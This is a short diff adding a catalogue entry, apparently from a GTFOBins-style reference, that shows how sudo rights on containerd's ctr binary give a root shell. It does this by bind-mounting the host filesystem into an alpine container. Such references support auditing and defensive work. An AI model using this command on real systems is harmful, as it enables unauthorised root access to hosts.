@@ -1,0 +1,8 @@
+---
+functions:
+  sudo:
+   - description: |
+      If ctr sudo permissions, you can use it to escape to a root shell. It is necessary to add an existing image.
+   - code: |
+      sudo /usr/bin/ctr run --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest bash
+---
